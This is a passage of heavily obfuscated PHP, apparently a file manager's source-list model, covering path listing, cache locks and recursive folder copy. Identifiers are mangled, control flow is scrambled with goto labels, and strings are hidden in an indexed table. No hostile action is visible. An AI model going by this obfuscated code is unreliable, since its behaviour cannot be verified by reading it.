‡¬ß¶[33], $F÷‘ ‡¬ß¶[397]); goto cœğ‡«»¿Í; FËÜóéİì: } public function parentLevelArray($aùÉÁ»¦…É) { $e­½ù‰èÎ© =& $_SERVER[Æ¼ôºÙï]; $aùÉÁ»¦…É = explode($e­½ù‰èÎ©[47], trim($aùÉÁ»¦…É, $e­½ù‰èÎ©[47])); return array_remove_value($aùÉÁ»¦…É, $e­½ù‰èÎ©[486]); } public function listAll($B³ŠÜ‡—â) { goto d©˜œ‡Ô¯î; fîœÑôˆ³: $d“ßê—¯Û = array(); foreach ($A°ÂÙ›Î¬ as $f¤ÙÑÁÓÅ => $côÜë‹™•) { goto FÄª„­„Òì; c¤§—àÍĞÓ: if (!$côÜë‹™•[$AÕ•·óµ­[388]]) { $F‡‹Ÿ®‚Ú¡[$AÕ•·óµ­[436]] = $côÜë‹™•[$AÕ•·óµ­[436]]; $F‡‹Ÿ®‚Ú¡[$AÕ•·óµ­[85]] = $côÜë‹™•[$AÕ•·óµ­[75]]; } $d“ßê—¯Û[] = $F‡‹Ÿ®‚Ú¡; goto e¾µ‰ĞâÄ°; FÄª„­„Òì: $e•ù··¹Ú¹ = $this->parentLevelArray($côÜë‹™•[$AÕ•·óµ­[477]]); array_shift($e•ù··¹Ú¹); $aƒÕóÆÔ™ = $DËºÁÏİ‘²; goto F¥£œÇÖ§¯; F¥£œÇÖ§¯: for ($aË’ºÒëâ» = 0; $aË’ºÒëâ» < count($e•ù··¹Ú¹); $aË’ºÒëâ»++) { $aƒÕóÆÔ™ .= $A°ÂÙ›Î¬[$e•ù··¹Ú¹[$aË’ºÒëâ»]][$AÕ•·óµ­[28]] . $AÕ•·óµ­[8]; } $aƒÕóÆÔ™ .= $côÜë‹™•[$AÕ•·óµ­[28]]; if ($côÜë‹™•[$AÕ•·óµ­[388]]) { $aƒÕóÆÔ™ .= $AÕ•·óµ­[8]; } goto aŸÌä˜§£; aŸÌä˜§£: $aƒÕóÆÔ™ = str_replace($AÕ•·óµ­[485], $AÕ•·óµ­[8], $aƒÕóÆÔ™); $aƒÕóÆÔ™ = str_replace($AÕ•·óµ­[485], $AÕ•·óµ­[8], $aƒÕóÆÔ™); $F‡‹Ÿ®‚Ú¡ = array($AÕ•·óµ­[405] => str_replace($AÕ•·óµ­[485], $AÕ•·óµ­[8], $aƒÕóÆÔ™), $AÕ•·óµ­[506] => intval($côÜë‹™•[$AÕ•·óµ­[388]]), $AÕ•·óµ­[84] => $this->pathInfoFilter($côÜë‹™•, !0)); goto c¤§—àÍĞÓ; e¾µ‰ĞâÄ°: } return $d“ßê—¯Û; goto F”â§Àš¦Õ; d©˜œ‡Ô¯î: $AÕ•·óµ­ =& $_SERVER[Æ¼ôºÙï]; $Eö±¶×Ëìİ = $this->sourceInfo($B³ŠÜ‡—â); $f™™ŸÀöë = array($AÕ•·óµ­[500] => array($AÕ•·óµ­[501], $Eö±¶×Ëìİ[$AÕ•·óµ­[477]] . $B³ŠÜ‡—â . $AÕ•·óµ­[502]), $AÕ•·óµ­[503] => 0); goto Eğó®¬Âù·; Eğó®¬Âù·: $fËàÃÃà¥… = $AÕ•·óµ­[504]; $F÷£â©ŒèÊ = "\x4c\105\106\x54\40\x4a\117\x49\116\40{$this->tablePrefix}\151\x6f\x5f\x66\151\154\145\x20\146\x69\x6c\x65\x20\157\156\40\x73\157\165\162\x63\x65\x2e\146\x69\154\x65\111\104\40\75\x20\x66\x69\154\145\56\146\151\x6c\145\x49\104"; $A°ÂÙ›Î¬ = $this->alias($AÕ•·óµ­[505])->field($fËàÃÃà¥…)->where($f™™ŸÀöë)->join($F÷£â©ŒèÊ)->select(); goto E¿£íŒ¿‘¾; E¿£íŒ¿‘¾: $this->_listAppendAuth($A°ÂÙ›Î¬); $this->_listAppendUser($A°ÂÙ›Î¬); $this->_listAppendPath($A°ÂÙ›Î¬); goto dŠ—¿®àö; dŠ—¿®àö: $A°ÂÙ›Î¬ = array_to_keyvalue($A°ÂÙ›Î¬, $AÕ•·óµ­[387]); $DËºÁÏİ‘² = "\57{$Eö±¶×Ëìİ[$AÕ•·óµ­[28]]}\x2f"; $DËºÁÏİ‘² = $DËºÁÏİ‘² == $AÕ•·óµ­[485] ? $AÕ•·óµ­[8] : $DËºÁÏİ‘²; goto fîœÑôˆ³; F”â§Àš¦Õ: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($cğéì§ÂåÆ) { goto c·¢öó£ô; c·¢öó£ô: $aùÌ¨ßÊ‘ˆ =& $_SERVER[Æ¼ôºÙï]; if (!$this->allowLock()) { return; } $this->_lockCheck($aùÌ¨ßÊ‘ˆ[507], $cğéì§ÂåÆ); goto eƒ‘êë©Ò°; E’ñ™‰îÑ: $this->_lockEvent($cğéì§ÂåÆ, array($aùÌ¨ßÊ‘ˆ[510], $aùÌ¨ßÊ‘ˆ[511]), $bâÌÛ­Û); $this->_lockCheckEnd($aùÌ¨ßÊ‘ˆ[507], $cğéì§ÂåÆ); goto fÍ—ÉÜãäæ; eƒ‘êë©Ò°: $bâÌÛ­Û = 1; $this->_lockEvent($cğéì§ÂåÆ, array($aùÌ¨ßÊ‘ˆ[508], $aùÌ¨ßÊ‘ˆ[509]), $bâÌÛ­Û); $this->_lockParent($cğéì§ÂåÆ, array($aùÌ¨ßÊ‘ˆ[509]), $bâÌÛ­Û); goto E’ñ™‰îÑ; fÍ—ÉÜãäæ: } public function lockCopyEnd($b¶àîº’Äö) { $C·ÁÚòéÊö =& $_SERVER[Æ¼ôºÙï]; if (!$this->allowLock()) { return; } $cĞê½¥¨ = 0; $this->_lockEvent($b¶àîº’Äö, array($C·ÁÚòéÊö[508], $C·ÁÚòéÊö[509]), $cĞê½¥¨); $this->_lockParent($b¶àîº’Äö, array($C·ÁÚòéÊö[509]), $cĞê½¥¨); $this->_lockEvent($b¶àîº’Äö, array($C·ÁÚòéÊö[510], $C·ÁÚòéÊö[511]), $cĞê½¥¨); } public function lockWriteStart($eŸï¡ƒ¹, $Eˆ»³ö‚ø = '') { goto A‰’æÅ•µ; b÷›°ÑŠÇ: $this->_lockParent($eŸï¡ƒ¹, array($F–¾±ğ†Åå[507], $F–¾±ğ†Åå[509]), $dñá²„æ¢æ); $this->_lockCheckEnd($F–¾±ğ†Åå[508], $eŸï¡ƒ¹); goto CÆõğÒËÕ³; A‰’æÅ•µ: $F–¾±ğ†Åå =& $_SERVER[Æ¼ôºÙï]; if (!$this->allowLock()) { return; } $this->_lockCheck($F–¾±ğ†Åå[508], $eŸï¡ƒ¹); goto cÉŞÏÊƒÈ ; cÉŞÏÊƒÈ : $dñá²„æ¢æ = 1; $this->_lockKey($F–¾±ğ†Åå[512] . $eŸï¡ƒ¹ . $F–¾±ğ†Åå[94] . $Eˆ»³ö‚ø, $dñá²„æ¢æ); $this->_lockEvent($eŸï¡ƒ¹, array($F–¾±ğ†Åå[507], $F–¾±ğ†Åå[509]), $dñá²„æ¢æ); goto b÷›°ÑŠÇ; CÆõğÒËÕ³: } public function lockWriteEnd($fåö‘ˆ°†®, $aò±¦œâ = '') { $AŠ„Âï½–† =& $_SERVER[Æ¼ôºÙï]; if (!$this->allowLock()) { return; } $b†Ÿ±œ¶Æ© = 0; $this->_lockKey($AŠ„Âï½–†[512] . $fåö‘ˆ°†® . $AŠ„Âï½–†[94] . $aò±¦œâ, $b†Ÿ±œ¶Æ©); $this->_lockEvent($fåö‘ˆ°†®, array($AŠ„Âï½–†[507], $AŠ„Âï½–†[509]), $b†Ÿ±œ¶Æ©); $this->_lockParent($fåö‘ˆ°†®, array($AŠ„Âï½–†[507], $AŠ„Âï½–†[509]), $b†Ÿ±œ¶Æ©); } public function lockMoveStart($c¶‡ÒŸí²ä) { goto e®ŒŞ­öÄ; A‹Áœô½öÃ: $this->_lockParent($c¶‡ÒŸí²ä, array($dÑÊ½°„İ¡[507], $dÑÊ½°„İ¡[509]), $díŠóÏÀ­à); $this->_lockEvent($c¶‡ÒŸí²ä, array($dÑÊ½°„İ¡[514], $dÑÊ½°„İ¡[510], $dÑÊ½°„İ¡[511]), $díŠóÏÀ­à); $this->_lockCheckEnd($dÑÊ½°„İ¡[509], $c¶‡ÒŸí²ä); goto E¡¹ëŠ¬ì; AßÈ´†‘êØ: $díŠóÏÀ­à = 1; $this->_lockKey($dÑÊ½°„İ¡[513] . $c¶‡ÒŸí²ä, $díŠóÏÀ­à); $this->_lockEvent($c¶‡ÒŸí²ä, array($dÑÊ½°„İ¡[507], $dÑÊ½°„İ¡[508]), $díŠóÏÀ­à); goto A‹Áœô½öÃ; e®ŒŞ­öÄ: $dÑÊ½°„İ¡ =& $_SERVER[Æ¼ôºÙï]; if (!$this->allowLock()) { return; } $this->_lockCheck($dÑÊ½°„İ¡[509], $c¶‡ÒŸí²ä); goto AßÈ´†‘êØ; E¡¹ëŠ¬ì: } public function lockMoveEnd($CĞğõÛá”) { goto Dò¾ù®õ­ ; bÈ²¼½¤«Ë: $this->_lockKey($F•µ†ŠÉ£[513] . $CĞğõÛá”, $a–áâÀøçù); $this->_lockEvent($CĞğõÛá”, array($F•µ†ŠÉ£[507], $F•µ†ŠÉ£[508]), $a–áâÀøçù); $this->_lockParent($CĞğõÛá”, array($F•µ†ŠÉ£[507], $F•µ†ŠÉ£[509]), $a–áâÀøçù); goto f šä…íùí; Dò¾ù®õ­ : $F•µ†ŠÉ£ =& $_SERVER[Æ¼ôºÙï]; if (!$this->allowLock()) { return; } $a–áâÀøçù = 0; goto bÈ²¼½¤«Ë; f šä…íùí: $this->_lockEvent($CĞğõÛá”, array($F•µ†ŠÉ£[514], $F•µ†ŠÉ£[510], $F•µ†ŠÉ£[511]), $a–áâÀøçù); goto d°ôÜˆé; d°ôÜˆé: } private function _lockCheck($A²–Š¹ë²«, $A·½°…—Ş„) { goto eìù˜¼‹¥; cÆÓİ¯Úœ°: $aİÈèà›äÀ = array_reverse($this->parentLevelArray($a— Œ¢¡ÀÔ[$aÌÅ¢õ¥[477]])); foreach ($aİÈèà›äÀ as $A¢¹êèÔ) { $E£–†Ô•„ˆ = $A²–Š¹ë²« . $aÌÅ¢õ¥[516] . $A¢¹êèÔ; if (CacheLock::lockGet($aÌÅ¢õ¥[517] . $E£–†Ô•„ˆ)) { $a— Œ¢¡ÀÔ = $this->sourceInfo($A¢¹êèÔ); CacheLock::setErrorMsg($aÌÅ¢õ¥[159] . htmlspecialchars($a— Œ¢¡ÀÔ[$aÌÅ¢õ¥[28]]) . $aÌÅ¢õ¥[494] . $fØô“Ö¾Õ); $this->_lockKey($E£–†Ô•„ˆ, 1); $this->_lockKey($E£–†Ô•„ˆ, 0); } } goto aóÀ’ø¡§¿; F«†­ ÈÈÓ: $this->_lockTimeStart[$E£–†Ô•„ˆ] = timeFloat(); if (!is_array($a— Œ¢¡ÀÔ)) { return; } $fØô“Ö¾Õ = LNG($aÌÅ¢õ¥[515]); goto fääº©»„§; eìù˜¼‹¥: $aÌÅ¢õ¥ =& $_SERVER[Æ¼ôºÙï]; $a— Œ¢¡ÀÔ = $this->sourceInfo($A·½°…—Ş„); $E£–†Ô•„ˆ = $A²–Š¹ë²« . $aÌÅ¢õ¥[94] . $A·½°…—Ş„; goto F«†­ ÈÈÓ; fääº©»„§: CacheLock::setErrorMsg($aÌÅ¢õ¥[159] . htmlspecialchars($a— Œ¢¡ÀÔ[$aÌÅ¢õ¥[28]]) . $aÌÅ¢õ¥[494] . $fØô“Ö¾Õ); $this->_lockKey($E£–†Ô•„ˆ, 1); $this->_lockKey($E£–†Ô•„ˆ, 0); goto cÆÓİ¯Úœ°; aóÀ’ø¡§¿: } private function _lockCheckEnd($a»Œ¡®³™Ğ, $FŒˆ‡ƒ») { goto c÷ÛõôŞğß; F‡Šøãäï‰: if (!isset($this->_lockTimeStart[$EÙšÌÁˆˆ])) { return; } $bÁó‘¯•æ = timeFloat() - $this->_lockTimeStart[$EÙšÌÁˆˆ]; unset($this->_lockTimeStart[$EÙšÌÁˆˆ]); goto C½ÑŞ»ÔÇ; C½ÑŞ»ÔÇ: if ($bÁó‘¯•æ > 0.5) { unset(self::$cacheSourceInfo[$D°ïî¨é‚±[427] . $FŒˆ‡ƒ»]); } $F†‹’¡ÚÜà = $this->sourceInfo($FŒˆ‡ƒ»); if (!$F†‹’¡ÚÜà) { show_json(LNG($D°ïî¨é‚±[104]), !1); } goto a‹¾êäÉ¯Ú; c÷ÛõôŞğß: $D°ïî¨é‚± =& $_SERVER[Æ¼ôºÙï]; $EÙšÌÁˆˆ = $a»Œ¡®³™Ğ . $D°ïî¨é‚±[94] . $FŒˆ‡ƒ»; CacheLock::setErrorMsg($D°ïî¨é‚±[370]); goto F‡Šøãäï‰; a‹¾êäÉ¯Ú: } private function _lockParent($AêùÎèÁÇè, $bõŒ˜Á¡äÈ, $EŞ“â¡Èí) { if (!$this->autoLockSet) { return; } $F³÷’ÂÇÇé = $this->sourceInfo($AêùÎèÁÇè); if (!is_array($F³÷’ÂÇÇé)) { return; } $A•ˆÄâÎÀ‚ = array_reverse($this->parentLevelArray($F³÷’ÂÇÇé[$_SERVER[Æ¼ôºÙï][477]])); foreach ($A•ˆÄâÎÀ‚ as $a¤–—ÌŞÔ³) { $this->_lockEvent($a¤–—ÌŞÔ³, $bõŒ˜Á¡äÈ, $EŞ“â¡Èí); } } private function _lockEvent($D­ßÜÇ²¶, $dĞ†‹‹…“‹, $fˆ¿ññ˜ß½) { $BÄÅŒÔÃªî =& $_SERVER[Æ¼ôºÙï]; if (!$this->autoLockSet) { return; } foreach ($dĞ†‹‹…“‹ as $d‹ƒ‹ÊÄŠÇ) { $D¦¤ƒé—“ì = $d‹ƒ‹ÊÄŠÇ . $BÄÅŒÔÃªî[94] . $D­ßÜÇ²¶; if ($fˆ¿ññ˜ß½ && CacheLock::lockGet($BÄÅŒÔÃªî[517] . $D¦¤ƒé—“ì)) { continue; } $this->_lockKey($D¦¤ƒé—“ì, $fˆ¿ññ˜ß½); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($BößË·™ë, $CĞß¬ùÖ§Ş = 1) { $añŠÜÓá‚Á = $_SERVER[Æ¼ôºÙï][517] . md5($BößË·™ë); if ($CĞß¬ùÖ§Ş) { if (isset(self::$_lockItemArr[$añŠÜÓá‚Á])) { return; } self::$_lockItemArr[$añŠÜÓá‚Á] = 1; CacheLock::lock($añŠÜÓá‚Á, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$añŠÜÓá‚Á])) { return; } unset(self::$_lockItemArr[$añŠÜÓá‚Á]); CacheLock::unlock($añŠÜÓá‚Á); } } public function isParentOf($fß´Ìˆ­¤¬, $a’ÂÆ‰ªÈ) { goto câéÔŞõÚæ; a¹ÓÖŒĞ¡: $B–¦¿«Š· = $C½Ä’Ö¹²‘[$a¤°—­…ƒ[477]] . $C½Ä’Ö¹²‘[$a¤°—­…ƒ[387]] . $a¤°—­…ƒ[47]; $E¦Âøºñ‘ = $D…Òˆ³ùì[$a¤°—­…ƒ[477]] . $D…Òˆ³ùì[$a¤°—­…ƒ[387]] . $a¤°—­…ƒ[47]; $aÈƒÅªïŠ = strpos($E¦Âøºñ‘, $B–¦¿«Š·) === 0; goto B¾ªñ¯Ø§Â; câéÔŞõÚæ: $a¤°—­…ƒ =& $_SERVER[Æ¼ôºÙï]; $C½Ä’Ö¹²‘ = $this->sourceInfo($fß´Ìˆ­¤¬); $D…Òˆ³ùì = $this->sourceInfo($a’ÂÆ‰ªÈ); goto a¹ÓÖŒĞ¡; B¾ªñ¯Ø§Â: return $aÈƒÅªïŠ; goto c±Û™êÆç»; c±Û™êÆç»: } private $targetIsDelete = 0; public function copy($C¼Å‰Ô÷Üê, $bŠ¥ßÇ¯, $BÕ®®óª£Ÿ = REPEAT_REPLACE, $f–Ê“Ú­† = '') { goto aâøäÊĞ§³; Aèß®Ä“éš: $this->updateModifyTime($bŠ¥ßÇ¯); return $D­†™³­„; goto B¸Â±íŒ­; fÁ‰’ä²ĞÃ: if ($CéèÚœ˜—[$C¿ó«È¶´İ[388]] == $C¿ó«È¶´İ[86] && $F§Ëõ˜ø®Õ == $D­†™³­„) { $this->folderSizeResetChildren($F§Ëõ˜ø®Õ); } Model($C¿ó«È¶´İ[521])->addAll($AùÔ¡ÛğçÒ[$C¿ó«È¶´İ[519]], array(), !0); if ($F§Ëõ˜ø®Õ != $D­†™³­„ || $CéèÚœ˜—[$C¿ó«È¶´İ[388]] == $C¿ó«È¶´İ[86]) { Model($C¿ó«È¶´İ[522])->eventCopy($D­†™³­„); } goto AÖ¨™ê¾À; aâøäÊĞ§³: $C¿ó«È¶´İ =& $_SERVER[Æ¼ôºÙï]; $CéèÚœ˜— = $this->sourceInfo($C¼Å‰Ô÷Üê); $c¡±ÅÖÊÃ¼ = $this->sourceInfo($bŠ¥ßÇ¯); goto aì–Ãˆè¸; c§¦ØøÏÊà: $this->lockCopyStart($C¼Å‰Ô÷Üê); $this->lockWriteStart($bŠ¥ßÇ¯, $dŒÃÏ¤·İ…); $AùÔ¡ÛğçÒ = array($C¿ó«È¶´İ[518] => array(), $C¿ó«È¶´İ[519] => array(), $C¿ó«È¶´İ[520] => array()); goto f„‚êˆ¤†»; AÖ¨™ê¾À: $this->saveAll($AùÔ¡ÛğçÒ[$C¿ó«È¶´İ[520]]); Model($C¿ó«È¶´İ[173])->linkAdd($AùÔ¡ÛğçÒ[$C¿ó«È¶´İ[518]]); $this->folderSizeReset($bŠ¥ßÇ¯); goto Aèß®Ä“éš; aì–Ãˆè¸: if (!$CéèÚœ˜— || !$c¡±ÅÖÊÃ¼ || $c¡±ÅÖÊÃ¼[$C¿ó«È¶´İ[388]] != $C¿ó«È¶´İ[86]) { return !1; } if ($this->isParentOf($C¼Å‰Ô÷Üê, $bŠ¥ßÇ¯)) { return !1; } $dŒÃÏ¤·İ… = $f–Ê“Ú­† ? $f–Ê“Ú­† : $CéèÚœ˜—[$C¿ó«È¶´İ[28]]; goto c§¦ØøÏÊà; e¾Ú¿Ù×Ş: $this->_childrenListClear(); $this->lockCopyEnd($C¼Å‰Ô÷Üê); $this->lockWriteEnd($bŠ¥ßÇ¯, $dŒÃÏ¤·İ…); goto fÁ‰’ä²ĞÃ; f„‚êˆ¤†»: $this->targetIsDelete = intval($CéèÚœ˜—[$C¿ó«È¶´İ[414]]); $F§Ëõ˜ø®Õ = $this->fileNameExistCache($bŠ¥ßÇ¯, $CéèÚœ˜—[$C¿ó«È¶´İ[28]]); $D­†™³­„ = $this->_copy($C¼Å‰Ô÷Üê, $bŠ¥ßÇ¯, $BÕ®®óª£Ÿ, $AùÔ¡ÛğçÒ, !0, $f–Ê“Ú­†); goto e¾Ú¿Ù×Ş; B¸Â±íŒ­: } private function _copy($a–±İËÚÁ, $CóèÃÎÈ‹š, $C‰•İš³°, &$D‡ÅŒ¿ğ³İ, $EÛ…ÛÆÄ¥ƒ, $c·Á‹Ø‚‹¶ = '') { goto B…˜´·½Å‚; E‰Ò—§†‡ö: $BĞ¼½ŒÈ‹Ä = $c·Á‹Ø‚‹¶ ? $c·Á‹Ø‚‹¶ : $aäÚ…•ó[$aã’õ³›÷¨[28]]; $c£Ëà™‰ã = $this->fileNameExistCache($CóèÃÎÈ‹š, $BĞ¼½ŒÈ‹Ä); if ($EÛ…ÛÆÄ¥ƒ) { $this->_childrenAllMake($a–±İËÚÁ); if ($d…çóò§è— && $c£Ëà™‰ã) { $this->_childrenAllMake($c£Ëà™‰ã); } } goto BÃÍ£“±Ş¼; BÃÍ£“±Ş¼: if (!$c£Ëà™‰ã) { return $this->_copyCreate($a–±İËÚÁ, $CóèÃÎÈ‹š, $BĞ¼½ŒÈ‹Ä, $D‡ÅŒ¿ğ³İ); } $Fé¾¹„­ = $c£Ëà™‰ã; if ($d…çóò§è—) { if ($C‰•İš³° == REPEAT_RENAME_FOLDER) { $BĞ¼½ŒÈ‹Ä = $this->fileNameAutoCache($CóèÃÎÈ‹š, $BĞ¼½ŒÈ‹Ä, $C‰•İš³°, $d…çóò§è—); $Fé¾¹„­ = $this->_copyCreate($a–±İËÚÁ, $CóèÃÎÈ‹š, $BĞ¼½ŒÈ‹Ä, $D‡ÅŒ¿ğ³İ); } else { $AôËÊŞ…† = $this->_childrenList($a–±İËÚÁ); foreach ($AôËÊŞ…† as $d‡…Ñ™¥¶Á) { $this->_copy($d‡…Ñ™¥¶Á[$aã’õ³›÷¨[387]], $c£Ëà™‰ã, $C‰•İš³°, $D‡ÅŒ¿ğ³İ, !1); } } } else { if ($C‰•İš³° == REPEAT_RENAME || $C‰•İš³° == REPEAT_RENAME_FOLDER) { $BĞ¼½ŒÈ‹Ä = $this->fileNameAutoCache($CóèÃÎÈ‹š, $BĞ¼½ŒÈ‹Ä, $C‰•İš³°, $d…çóò§è—); $Fé¾¹„­ = $this->_copyCreate($a–±İËÚÁ, $CóèÃÎÈ‹š, $BĞ¼½ŒÈ‹Ä, $D‡ÅŒ¿ğ³İ); } else { if ($C‰•İš³° == REPEAT_REPLACE) { $FŒ†îÈÈ¦£ = $this->sourceInfoCache($c£Ëà™‰ã); $cß‘õ‘â¿Ï = $this->fileHistory($FŒ†îÈÈ¦£, $aäÚ…•ó[$aã’õ³›÷¨[436]], $aäÚ…•ó[$aã’õ³›÷¨[77]]); if ($cß‘õ‘â¿Ï) { $D‡ÅŒ¿ğ³İ[$aã’õ³›÷¨[518]][] = $aäÚ…•ó[$aã’õ³›÷¨[436]]; } } else { if ($C‰•İš³° == REPEAT_SKIP) { } } } Hook::trigger($aã’õ³›÷¨[523], array($aã’õ³›÷¨[524], $aäÚ…•ó, 0)); } goto b÷©–¨‚§Ü; B…˜´·½Å‚: $aã’õ³›÷¨ =& $_SERVER[Æ¼ôºÙï]; $aäÚ…•ó = $this->sourceInfoCache($a–±İËÚÁ); $d…çóò§è— = $aäÚ…•ó[$aã’õ³›÷¨[388]] == $aã’õ³›÷¨[86]; goto E‰Ò—§†‡ö; b÷©–¨‚§Ü: return $Fé¾¹„­; goto e•êÂ¼ãÜ; e•êÂ¼ãÜ: } private function _copyCreate($B¹¤¦×‚ö, $e®»ãò¬Õ©, $FŠŸàÀË§¢, &$Fåèº‚–©“) { goto BÆƒ‚¨ï; BÆƒ‚¨ï: $fºÓ¾²½­¾ =& $_SERVER[Æ¼ôºÙï]; $Fí÷Ÿ¯®ÚÆ = $this->sourceInfoCache($B¹¤¦×‚ö); $fÀç“Õ‚‚ = $this->sourceInfoCache($e®»ãò¬Õ©); goto a·Ë†„«°É; Eåµ¨œæ: $this->_childrenListAll($B¹¤¦×‚ö, $C…Ë—–£Ğö); $dõì—Š¦‹ = count($C…Ë—–£Ğö); if ($dõì—Š¦‹ == 0) { return $eÑóˆØ; } goto a‰öŠ´ç¾; CÇ¹±ˆÎÙ: $eÑóˆØ = $this->add($CÙ±¹”±†±); $C‘¯Ñí‡àÂ = array($fºÓ¾²½­¾[387] => $eÑóˆØ, $fºÓ¾²½­¾[28] => $FŠŸàÀË§¢); $this->_copyApplyMeta($C‘¯Ñí‡àÂ, $Fåèº‚–©“); goto DßÅßÏù»; a·Ë†„«°É: $CÙ±¹”±†± = $this->_makeItemData($Fí÷Ÿ¯®ÚÆ, $fÀç“Õ‚‚, $FŠŸàÀË§¢); Hook::trigger($fºÓ¾²½­¾[525], $CÙ±¹”±†±); Hook::trigger($fºÓ¾²½­¾[526], array($fºÓ¾²½­¾[527], $CÙ±¹”±†±, 0)); goto CÇ¹±ˆÎÙ; BÏÕŠª¾ßï: $this->chunkEventSet($fºÓ¾²½­¾[532], array($fºÓ¾²½­¾[533], $CÙ±¹”±†±, $dõì—Š¦‹)); $this->saveAll($cËØÛôÆŞÎ); return $eÑóˆØ; goto fŠƒ¾…§¾; DßÅßÏù»: if ($Fí÷Ÿ¯®ÚÆ[$fºÓ¾²½­¾[388]] != $fºÓ¾²½­¾[86]) { $Fåèº‚–©“[$fºÓ¾²½­¾[518]][] = $Fí÷Ÿ¯®ÚÆ[$fºÓ¾²½­¾[436]]; return $eÑóˆØ; } $C…Ë—–£Ğö = array(); $bŸÈÎÄ½èÇ = array(); goto Eåµ¨œæ; d‹Û‰š™ñ¿: foreach ($Dæ ³ÊéÕ» as $BÅïƒËì) { $fÏõ‹·­íÜ = $BÅïƒËì[$fºÓ¾²½­¾[387]]; $EÖĞßéïè» = $this->_childrenMatch($e¾Å˜»šÇ, $BÅïƒËì, $A®ã¶¼¸); $dÛÔ´ºÊÓÅ[] = array($fºÓ¾²½­¾[387], $fÏõ‹·­íÜ, $fºÓ¾²½­¾[479], $EÖĞßéïè»[$fºÓ¾²½­¾[479]]); $cËØÛôÆŞÎ[] = array($fºÓ¾²½­¾[387], $fÏõ‹·­íÜ, $fºÓ¾²½­¾[477], $EÖĞßéïè»[$fºÓ¾²½­¾[477]]); $this->_copyApplyMeta($BÅïƒËì, $Fåèº‚–©“); if ($BÅïƒËì[$fºÓ¾²½­¾[388]] != $fºÓ¾²½­¾[86]) { $Fåèº‚–©“[$fºÓ¾²½­¾[518]][] = $BÅïƒËì[$fºÓ¾²½­¾[436]]; } } $this->chunkEventSet($fºÓ¾²½­¾[530], array($fºÓ¾²½­¾[531], $CÙ±¹”±†±, $dõì—Š¦‹)); $this->saveAll($dÛÔ´ºÊÓÅ); goto BÏÕŠª¾ßï; a‰öŠ´ç¾: $A®ã¶¼¸ = $this->sourceInfo($eÑóˆØ); foreach ($C…Ë—–£Ğö as $BÅïƒËì) { $C‚šÜÒÜŒ = $this->_makeItemData($BÅïƒËì, $A®ã¶¼¸, $BÅïƒËì[$fºÓ¾²½­¾[28]]); $C‚šÜÒÜŒ[$fºÓ¾²½­¾[477]] = $BÅïƒËì[$fºÓ¾²½­¾[477]]; $bŸÈÎÄ½èÇ[] = $C‚šÜÒÜŒ; } $this->chunkEventSet($fºÓ¾²½­¾[528], array($fºÓ¾²½­¾[529], $CÙ±¹”±†±, $dõì—Š¦‹)); goto a·¿¸ßÙ¢¿; aâ•ôğÙöæ: $e¾Å˜»šÇ[$B¹¤¦×‚ö] = $eÑóˆØ; $dÛÔ´ºÊÓÅ = array(); $cËØÛôÆŞÎ = array(); goto d‹Û‰š™ñ¿; a·¿¸ßÙ¢¿: $this->addAll($bŸÈÎÄ½èÇ, array(), !1); $Dæ ³ÊéÕ» = $this->where(array($fºÓ¾²½­¾[479] => $eÑóˆØ))->select(); $e¾Å˜»šÇ = $this->_childrenMakeRelation($C…Ë—–£Ğö, $Dæ ³ÊéÕ»); goto aâ•ôğÙöæ; fŠƒ¾…§¾: } private function _childrenMakeRelation($dÚäÌ‚²Í™, $C‰¹½äŠ¼è) { $cš¶œ÷É° =& $_SERVER[Æ¼ôºÙï]; $a‘ˆ“µáÔô = array(); $c×°Š¨è£ì = array(); foreach ($dÚäÌ‚²Í™ as $AÊ»ß·õÛ) { $eÆÍ¼»ˆÄ  = $AÊ»ß·õÛ[$cš¶œ÷É°[28]] . $cš¶œ÷É°[8] . $AÊ»ß·õÛ[$cš¶œ÷É°[477]]; $a‘ˆ“µáÔô[$eÆÍ¼»ˆÄ ] = $AÊ»ß·õÛ[$cš¶œ÷É°[387]]; } foreach ($C‰¹½äŠ¼è as $AÊ»ß·õÛ) { $eÆÍ¼»ˆÄ  = $AÊ»ß·õÛ[$cš¶œ÷É°[28]] . $cš¶œ÷É°[8] . $AÊ»ß·õÛ[$cš¶œ÷É°[477]]; $aÒ¥à¢Íà = $a‘ˆ“µáÔô[$eÆÍ¼»ˆÄ ]; $c×°Š¨è£ì[$aÒ¥à¢Íà] = $AÊ»ß·õÛ[$cš¶œ÷É°[387]]; } return $c×°Š¨è£ì; } private function _childrenMatch($C–ˆ˜‰‘ìè, $d›‚ò¤ø©Ö, $cì‹œØñİ§) { goto B¢¼«†’¼î; B¢¼«†’¼î: $C½¢ÃïÑ´ =& $_SERVER[Æ¼ôºÙï]; $D»ç¤ÁŞî = $cì‹œØñİ§[$C½¢ÃïÑ´[477]]; $C‡«ÆÚ‹Î = $this->parentLevelArray($d›‚ò¤ø©Ö[$C½¢ÃïÑ´[477]]); goto DãğÉŠ‰ê; DãğÉŠ‰ê: foreach ($C‡«ÆÚ‹Î as $FØñÄËØØù) { if (isset($C–ˆ˜‰‘ìè[$FØñÄËØØù])) { $D»ç¤ÁŞî .= $C–ˆ˜‰‘ìè[$FØñÄËØØù] . $C½¢ÃïÑ´[534]; } } $D»ç¤ÁŞî = rtrim($D»ç¤ÁŞî, $C½¢ÃïÑ´[47]) . $C½¢ÃïÑ´[47]; $D–ŸÌéĞòÚ = $this->parentLevelArray($D»ç¤ÁŞî); goto Bãª¬‰æØÉ; Bãª¬‰æØÉ: $CàÒÄ´…Ô = $D–ŸÌéĞòÚ[count($D–ŸÌéĞòÚ) - 1]; return array($C½¢ÃïÑ´[479] => $CàÒÄ´…Ô, $C½¢ÃïÑ´[477] => $D»ç¤ÁŞî); goto F•Ğ²»§ÅŠ; F•Ğ²»§ÅŠ: } private function _makeItemData($F¸„’¾›¬Œ, $Aò÷»íŒÔ³, $aÏ““Î„ô) { $f¥¸¶ŒîÔ =& $_SERVER[Æ¼ôºÙï]; $dø¯º·í…² = array($f¥¸¶ŒîÔ[535] => $F¸„’¾›¬Œ[$f¥¸¶ŒîÔ[388]], $f¥¸¶ŒîÔ[404] => $aÏ““Î„ô, $f¥¸¶ŒîÔ[536] => $F¸„’¾›¬Œ[$f¥¸¶ŒîÔ[390]], $f¥¸¶ŒîÔ[437] => $F¸„’¾›¬Œ[$f¥¸¶ŒîÔ[436]], $f¥¸¶ŒîÔ[537] => $F¸„’¾›¬Œ[$f¥¸¶ŒîÔ[77]], 